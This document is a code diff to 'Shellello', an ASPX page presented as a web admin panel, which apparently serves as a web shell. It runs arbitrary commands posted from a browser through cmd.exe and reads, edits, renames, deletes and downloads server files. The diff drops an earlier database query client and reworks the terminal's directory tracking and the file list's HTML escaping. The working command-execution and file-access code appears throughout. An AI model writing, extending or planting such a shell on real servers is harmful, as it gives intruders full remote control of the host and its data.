@@ -1,26 +1,20 @@
 <%@ Page Language="C#" AutoEventWireup="true" %>
-<%@ Import Namespace="System.Data" %>
-<%@ Import Namespace="System.Data.SqlClient" %>
 <%@ Import Namespace="System.Diagnostics" %>
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Linq" %>
 <%@ Import Namespace="System.Security.Cryptography" %>
 <%@ Import Namespace="System.Text" %>
 <%@ Import Namespace="System.Web.Script.Serialization" %>
-<%@ Import Namespace="MySql.Data.MySqlClient" %>
-<%@ Import Namespace="Npgsql" %>
 
 <script runat="server">
 // ========== Shellello - Web Admin Panel (ASPX Edition) ==========
 // Version: 2.5.0
 // 
 // .NET Requirements:
-// - Minimum: .NET Framework 4.7.2+
-// - Recommended: .NET Framework 4.8
+// - Minimum: .NET Framework 3.5+
+// - Recommended: .NET Framework 4.0+
 // 
-// Required NuGet Packages:
-// - MySql.Data (for MySQL support)
-// - Npgsql (for PostgreSQL support)
+// No external dependencies required
 
 // ========== CONFIGURATION ==========
 protected const string AppName = "Shellello Admin";
@@ -149,6 +143,11 @@ private string FormatBytes(long bytes)
     return $"{len:0.##} {sizes[order]}";
 }
 
+private string NormalizePath(string path)
+{
+    return path.Replace("\\", "/");
+}
+
 // ========== API HANDLERS ==========
 private void HandleApiRequest()
 {
@@ -194,18 +193,6 @@ private void HandleApiRequest()
             case "exec_cmd":
                 response = HandleExecCmd();
                 break;
-            case "db_connect":
-                response = HandleDbConnect();
-                break;
-            case "db_disconnect":
-                response = HandleDbDisconnect();
-                break;
-            case "db_query":
-                response = HandleDbQuery();
-                break;
-            case "db_export_csv":
-                HandleDbExportCsv();
-                return;
         }
     }
     catch (Exception ex)
@@ -221,7 +208,7 @@ private object HandleListFiles()
 {
     string path = Request.QueryString["path"] ?? Directory.GetCurrentDirectory();
     var files = GetFileList(path);
-    return new { status = "success", data = files, path };
+    return new { status = "success", data = files, path = NormalizePath(path) };
 }
 
 private object HandleReadFile()
@@ -322,80 +309,10 @@ private object HandleExecCmd()
     string cwd = Request.Form["cwd"];
     
     var result = ExecuteCommand(cmd, cwd);
-    return new { status = "success", data = new { output = result.Item1, exit_code = result.Item2 } };
+    return new { status = "success", data = new { output = result.Item1, exit_code = result.Item2, cwd = result.Item3 } };
 }
 
-private object HandleDbConnect()
-{
-    string driver = Request.Form["driver"];
-    string host = Request.Form["host"];
-    string port = Request.Form["port"];
-    string dbname = Request.Form["dbname"];
-    string user = Request.Form["user"];
-    string pass = Request.Form["pass"];
-    
-    // Test connection before storing in session
-    try
-    {
-        string connStr = BuildConnectionString(driver, host, port, dbname, user, pass);
-        using (var conn = CreateDbConnection(driver, connStr))
-        {
-            conn.Open();
-            conn.Close();
-        }
-        
-        // Connection successful, store in session
-        Session["db_driver"] = driver;
-        Session["db_host"] = host;
-        Session["db_port"] = port;
-        Session["db_name"] = dbname;
-        Session["db_user"] = user;
-        Session["db_pass"] = pass;
-        
-        return new { status = "success", message = "Connected to database" };
-    }
-    catch (Exception ex)
-    {
-        return new { status = "error", message = "Connection failed: " + ex.Message };
-    }
-}
 
-private object HandleDbDisconnect()
-{
-    Session.Remove("db_driver");
-    return new { status = "success", message = "Disconnected" };
-}
-
-private object HandleDbQuery()
-{
-    string query = Request.Form["query"];
-    var results = ExecuteDbQuery(query);
-    return new { status = "success", data = new { columns = results.Item1, rows = results.Item2 } };
-}
-
-private void HandleDbExportCsv()
-{
-    string query = Request.Form["query"];
-    var results = ExecuteDbQuery(query);
-    
-    Response.ContentType = "text/csv";
-    Response.AddHeader("Content-Disposition", "attachment; filename=export.csv");
-    
-    var writer = new StreamWriter(Response.OutputStream);
-    
-    // Write headers
-    if (results.Item1.Count > 0)
-        writer.WriteLine(string.Join(",", results.Item1));
-    
-    // Write rows
-    foreach (var row in results.Item2)
-    {
-        var values = results.Item1.Select(col => row.ContainsKey(col) ? row[col]?.ToString() ?? "" : "");
-        writer.WriteLine(string.Join(",", values.Select(v => $"\"{v.Replace("\"", "\"\"")}\"")));
-    }
-    
-    writer.Flush();
-}
 
 // ========== FILE OPERATIONS ==========
 private List<object> GetFileList(string dir)
@@ -441,13 +358,33 @@ private List<object> GetFileList(string dir)
 }
 
 // ========== COMMAND EXECUTION ==========
-private Tuple<string, int> ExecuteCommand(string cmd, string cwd)
+private Tuple<string, int, string> ExecuteCommand(string cmd, string cwd)
 {
+    string workDir = string.IsNullOrEmpty(cwd) ? Directory.GetCurrentDirectory() : cwd;
+    string newCwd = workDir;
+    
+    // Handle cd command
+    if (cmd.Trim().ToLower().StartsWith("cd "))
+    {
+        string targetDir = cmd.Trim().Substring(3).Trim();
+        string testPath = Path.IsPathRooted(targetDir) ? targetDir : Path.Combine(workDir, targetDir);
+        
+        if (Directory.Exists(testPath))
+        {
+            newCwd = Path.GetFullPath(testPath);
+            return Tuple.Create("Changed directory to: " + newCwd, 0, NormalizePath(newCwd));
+        }
+        else
+        {
+            return Tuple.Create("Directory not found: " + targetDir, 1, NormalizePath(workDir));
+        }
+    }
+    
     var startInfo = new ProcessStartInfo
     {
         FileName = "cmd.exe",
         Arguments = $"/c {cmd}",
-        WorkingDirectory = string.IsNullOrEmpty(cwd) ? Directory.GetCurrentDirectory() : cwd,
+        WorkingDirectory = workDir,
         RedirectStandardOutput = true,
         RedirectStandardError = true,
         UseShellExecute = false,
@@ -458,67 +395,7 @@ private Tuple<string, int> ExecuteCommand(string cmd, string cwd)
     {
         string output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
         process.WaitForExit();
-        return Tuple.Create(output, process.ExitCode);
-    }
-}
-
-// ========== DATABASE OPERATIONS ==========
-private Tuple<List<string>, List<Dictionary<string, object>>> ExecuteDbQuery(string query)
-{
-    string driver = Session["db_driver"] as string;
-    string host = Session["db_host"] as string;
-    string port = Session["db_port"] as string;
-    string dbname = Session["db_name"] as string;
-    string user = Session["db_user"] as string;
-    string pass = Session["db_pass"] as string;
-
-    string connectionString;
-    IDbConnection connection;
-
-    if (driver == "mysql")
-    {
-        connectionString = $"Server={host};Port={port};Database={dbname};Uid={user};Pwd={pass};";
-        connection = new MySqlConnection(connectionString);
-    }
-    else if (driver == "postgres")
-    {
-        connectionString = $"Host={host};Port={port};Database={dbname};Username={user};Password={pass};";
-        connection = new NpgsqlConnection(connectionString);
-    }
-    else if (driver == "sqlserver")
-    {
-        connectionString = $"Server={host},{port};Database={dbname};User Id={user};Password={pass};";
-        connection = new SqlConnection(connectionString);
-    }
-    else
-    {
-        throw new Exception("Unsupported database driver");
-    }
-
-    using (connection)
-    {
-        connection.Open();
-        using (var command = connection.CreateCommand())
-        {
-            command.CommandText = query;
-            using (var reader = command.ExecuteReader())
-            {
-                var columns = new List<string>();
-                for (int i = 0; i < reader.FieldCount; i++)
-                    columns.Add(reader.GetName(i));
-
-                var rows = new List<Dictionary<string, object>>();
-                while (reader.Read())
-                {
-                    var row = new Dictionary<string, object>();
-                    for (int i = 0; i < reader.FieldCount; i++)
-                        row[columns[i]] = reader.GetValue(i);
-                    rows.Add(row);
-                }
-
-                return Tuple.Create(columns, rows);
-            }
-        }
+        return Tuple.Create(output, process.ExitCode, NormalizePath(workDir));
     }
 }
 
@@ -552,9 +429,6 @@ private void RenderPageContent(string page)
             break;
         case "files":
             RenderFileManager();
-            break;
-        case "database":
-            RenderDatabase();
             break;
         case "terminal":
             RenderTerminal();
@@ -751,41 +625,76 @@ function loadFiles() {
         });
 }
 
+function normalizePath(path) {
+    return path.replace(/\\\\/g, '/');
+}
+
+function esc(s) {
+    var str = String(s);
+    str = str.replace(/&/g,'&amp;');
+    str = str.replace(/</g,'&lt;');
+    str = str.replace(/>/g,'&gt;');
+    str = str.replace(/'/g,'&#39;');
+    str = str.split('""').join('&quot;');
+    return str;
+}
+
 function renderFiles(files) {
     var tbody = document.getElementById('fileList');
     if (!files.length) {
         tbody.innerHTML = '<tr><td colspan=""6"" class=""text-center text-muted"">Empty</td></tr>';
         return;
     }
-    var html = '';
+    tbody.innerHTML = '';
     for (var i = 0; i < files.length; i++) {
         var f = files[i];
         var isDir = f.type === 'dir';
         var icon = f.name === '..' ? '⬆️' : (isDir ? '📁' : '📄');
         var cls = isDir ? 'file-name dir' : 'file-name';
         
-        var fullPath = f.name === '..' ? '' : (currentPath + '\\' + f.name);
-        var dbl = f.name === '..' ? 'goUp()' : (isDir ? 
-            'navigateTo(\\'' + esc(fullPath) + '\\')' : 
-            'editFile(\\'' + esc(fullPath) + '\\')');
+        var fullPath = f.name === '..' ? '' : normalizePath(currentPath + '/' + f.name);
         
-        var acts = f.name === '..' ? '' : 
-            '<button class=""action-btn"" onclick=""event.stopPropagation();showRename(\\'' + esc(fullPath) + '\\',\\'' + esc(f.name) + '\\')"">✏️</button>' +
-            (isDir ? '' : '<button class=""action-btn"" onclick=""event.stopPropagation();download(\\'' + esc(fullPath) + '\\')"">⬇️</button>') +
-            '<button class=""action-btn danger"" onclick=""event.stopPropagation();showDelete(\\'' + esc(fullPath) + '\\',\\'' + esc(f.name) + '\\')"">🗑️</button>';
-        html += '<tr ondblclick="' + dbl + '">' +
-            '<td><span class=""file-icon"">' + icon + '</span><span class=""' + cls + '"">' + esc(f.name) + '</span></td>' +
+        var row = document.createElement('tr');
+        (function(fp, fn, isDirectory) {
+            if (fn === '..') {
+                row.ondblclick = function() { goUp(); };
+            } else if (isDirectory) {
+                row.ondblclick = function() { navigateTo(fp); };
+            } else {
+                row.ondblclick = function() { editFile(fp); };
+            }
+        })(fullPath, f.name, isDir);
+        
+        var actHtml = '';
+        if (f.name !== '..') {
+            actHtml = '<button class=""action-btn"" data-action=""rename"" data-path=""' + esc(fullPath) + '"" data-name=""' + esc(f.name) + '"">✏️</button>';
+            if (!isDir) {
+                actHtml += '<button class=""action-btn"" data-action=""download"" data-path=""' + esc(fullPath) + '"">⬇️</button>';
+            }
+            actHtml += '<button class=""action-btn danger"" data-action=""delete"" data-path=""' + esc(fullPath) + '"" data-name=""' + esc(f.name) + '"">🗑️</button>';
+        }
+        
+        row.innerHTML = '<td><span class=""file-icon"">' + icon + '</span><span class=""' + cls + '"">' + esc(f.name) + '</span></td>' +
             '<td class=""text-muted"">' + f.size + '</td>' +
-            '<td><code>' + f.perms + '</code></td>' +
-            '<td class=""text-muted"">' + (f.owner || 'N/A') + '</td>' +
+            '<td><code>' + esc(f.perms) + '</code></td>' +
+            '<td class=""text-muted"">' + esc(f.owner || 'N/A') + '</td>' +
             '<td class=""text-muted"">' + f.modified + '</td>' +
-            '<td class=""action-btns"">' + acts + '</td></tr>';
+            '<td class=""action-btns"">' + actHtml + '</td>';
+        
+        row.querySelectorAll('button').forEach(function(btn) {
+            btn.onclick = function(e) {
+                e.stopPropagation();
+                var action = this.getAttribute('data-action');
+                var path = this.getAttribute('data-path');
+                var name = this.getAttribute('data-name');
+                if (action === 'rename') showRename(path, name);
+                else if (action === 'download') download(path);
+                else if (action === 'delete') showDelete(path, name);
+            };
+        });
+        
+        tbody.appendChild(row);
     }
-    tbody.innerHTML = html;
-}
-
-function esc(s) {
-    return s.replace(/\\\\/g,'\\\\\\\\').replace(/'/g,\"\\\\'\" );
 }
 
 function navigateTo(path) { 
@@ -794,10 +703,10 @@ function navigateTo(path) {
 }
 
 function goUp() {
-    var idx = currentPath.lastIndexOf('\\');
+    var idx = currentPath.lastIndexOf('/');
     if (idx > 0) {
         currentPath = currentPath.substring(0, idx);
-        if (currentPath.indexOf('\\') === -1) currentPath += '\\';
+        if (currentPath.indexOf('/') === -1) currentPath += '/';
     }
     loadFiles();
 }
@@ -819,7 +728,7 @@ function editFile(path) {
         .then(data => {
             if (data.status === 'success') {
                 editingFile = path;
-                document.getElementById('editorTitle').textContent = 'Edit: ' + path.split('\\\\').pop();
+                document.getElementById('editorTitle').textContent = 'Edit: ' + path.split('/').pop();
                 document.getElementById('fileEditor').value = data.content;
                 showModal('editorModal');
             } else { toast(data.message, 'error'); }
@@ -936,131 +845,6 @@ function confirmRename() {
     phContent.Controls.Add(new Literal { Text = html.ToString() });
 }
 
-private void RenderDatabase()
-{
-    var html = new StringBuilder();
-    html.Append(@"
-<div class='card'>
-    <div class='card-header'><span class='card-icon'>🗄️</span><h3>Database Client</h3></div>
-    <div class='db-form'>
-        <select id='dbDriver' class='form-control'>
-            <option value='mysql'>MySQL</option>
-            <option value='postgres'>PostgreSQL</option>
-            <option value='sqlserver'>SQL Server</option>
-        </select>
-        <input type='text' id='dbHost' class='form-control' placeholder='Host' value='localhost'>
-        <input type='text' id='dbPort' class='form-control' placeholder='Port' value='3306'>
-        <input type='text' id='dbName' class='form-control' placeholder='Database'>
-        <input type='text' id='dbUser' class='form-control' placeholder='Username'>
-        <input type='password' id='dbPass' class='form-control' placeholder='Password'>
-    </div>
-    <button class='btn btn-primary' onclick='dbConnect()'>Connect</button>
-    <button class='btn btn-secondary' onclick='dbDisconnect()'>Disconnect</button>
-</div>
-
-<div class='card'>
-    <div class='card-header'><span class='card-icon'>⚡</span><h3>Query</h3></div>
-    <div class='db-query'>
-        <textarea id='dbQuery' class='form-control' placeholder='SELECT * FROM table_name LIMIT 10'></textarea>
-    </div>
-    <button class='btn btn-primary' onclick='dbExecute()'>Execute</button>
-    <button class='btn btn-secondary' onclick='dbExportCsv()'>📥 Export CSV</button>
-</div>
-
-<div class='card'>
-    <div id='dbResults'></div>
-</div>
-
-<script>
-function initDatabase() {
-}
-
-function dbConnect() {
-    var fd = new FormData();
-    fd.append('driver', document.getElementById('dbDriver').value);
-    fd.append('host', document.getElementById('dbHost').value);
-    fd.append('port', document.getElementById('dbPort').value);
-    fd.append('dbname', document.getElementById('dbName').value);
-    fd.append('user', document.getElementById('dbUser').value);
-    fd.append('pass', document.getElementById('dbPass').value);
-    
-    fetch('?api=1&action=db_connect', {method:'POST', body:fd})
-        .then(r => r.json())
-        .then(data => {
-            toast(data.message, data.status);
-        });
-}
-
-function dbDisconnect() {
-    fetch('?api=1&action=db_disconnect', {method:'POST'})
-        .then(r => r.json())
-        .then(data => {
-            toast(data.message, data.status);
-            document.getElementById('dbResults').innerHTML = '';
-        });
-}
-
-function dbExecute() {
-    var query = document.getElementById('dbQuery').value.trim();
-    if (!query) { toast('Enter a query', 'error'); return; }
-    
-    var fd = new FormData();
-    fd.append('query', query);
-    
-    fetch('?api=1&action=db_query', {method:'POST', body:fd})
-        .then(r => r.json())
-        .then(data => {
-            if (data.status === 'success') {
-                renderDbResults(data.data);
-                toast('Query executed', 'success');
-            } else {
-                toast(data.message, 'error');
-            }
-        });
-}
-
-function renderDbResults(data) {
-    var html = '<div class=""db-table""><table><thead><tr>';
-    data.columns.forEach(col => {
-        html += '<th>' + col + '</th>';
-    });
-    html += '</tr></thead><tbody>';
-    data.rows.forEach(row => {
-        html += '<tr>';
-        data.columns.forEach(col => {
-            html += '<td>' + (row[col] != null ? row[col] : 'NULL') + '</td>';
-        });
-        html += '</tr>';
-    });
-    html += '</tbody></table></div>';
-    html += '<p class=""text-muted"" style=""margin-top:1rem;"">' + data.rows.length + ' rows returned</p>';
-    document.getElementById('dbResults').innerHTML = html;
-}
-
-function dbExportCsv() {
-    var query = document.getElementById('dbQuery').value.trim();
-    if (!query) { toast('Enter a query', 'error'); return; }
-    
-    var fd = new FormData();
-    fd.append('query', query);
-    
-    fetch('?api=1&action=db_export_csv', {method:'POST', body:fd})
-        .then(response => response.blob())
-        .then(blob => {
-            var url = window.URL.createObjectURL(blob);
-            var a = document.createElement('a');
-            a.href = url;
-            a.download = 'export.csv';
-            a.click();
-            toast('CSV exported', 'success');
-        });
-}
-</script>
-");
-    
-    phContent.Controls.Add(new Literal { Text = html.ToString() });
-}
-
 private void RenderTerminal()
 {
     var cwd = Directory.GetCurrentDirectory();
@@ -1075,7 +859,7 @@ Ready. Working directory: " + cwd + @"
 
 </div>
         <div class='terminal-input'>
-            <input type='text' id='terminalCmd' placeholder='Enter command...' onkeydown='if(event.key===""Enter"") runCmd()' autofocus>
+            <input type='text' id='terminalCmd' placeholder='Enter command...' onkeydown='if(event.key==""Enter"") runCmd()' autofocus>
             <button class='btn btn-primary' onclick='runCmd()'>Run</button>
             <button class='btn btn-secondary' onclick='clearTerminal()'>Clear</button>
         </div>
@@ -1115,20 +899,8 @@ function runCmd() {
             if (data.status === 'success') {
                 addToTerminal(data.data.output);
                 addToTerminal('Exit code: ' + data.data.exit_code + '\n');
-                
-                // Update working directory if cd command was used
-                if (cmd.trim().toLowerCase().startsWith('cd ')) {
-                    // Request current directory from server
-                    fetch('?api=1&action=exec_cmd', {
-                        method: 'POST',
-                        body: (() => { var fd = new FormData(); fd.append('cmd', 'cd'); fd.append('cwd', terminalCwd); return fd; })()
-                    })
-                    .then(r => r.json())
-                    .then(d => {
-                        if (d.status === 'success') {
-                            terminalCwd = d.data.output.trim();
-                        }
-                    });
+                if (data.data.cwd) {
+                    terminalCwd = data.data.cwd;
                 }
             } else {
                 addToTerminal('Error: ' + data.message + '\n');
@@ -1630,7 +1402,6 @@ private void RenderSettings()
                 <ul class="nav-tabs">
                     <li><a href="?page=dashboard" <% if (Request.QueryString["page"] == "dashboard" || String.IsNullOrEmpty(Request.QueryString["page"])) { %>class="active"<% } %>>📊 Dashboard</a></li>
                     <li><a href="?page=files" <% if (Request.QueryString["page"] == "files") { %>class="active"<% } %>>📁 File Manager</a></li>
-                    <li><a href="?page=database" <% if (Request.QueryString["page"] == "database") { %>class="active"<% } %>>🗄️ Database</a></li>
                     <li><a href="?page=terminal" <% if (Request.QueryString["page"] == "terminal") { %>class="active"<% } %>>💻 Terminal</a></li>
                     <li><a href="?page=settings" <% if (Request.QueryString["page"] == "settings") { %>class="active"<% } %>>⚙️ Settings</a></li>
                 </ul>
@@ -1671,8 +1442,6 @@ private void RenderSettings()
                     document.addEventListener('DOMContentLoaded', initFileManager);
                 } else if (currentPage === 'terminal') {
                     document.addEventListener('DOMContentLoaded', initTerminal);
-                } else if (currentPage === 'database') {
-                    document.addEventListener('DOMContentLoaded', initDatabase);
                 }
             </script>
         <% } %>
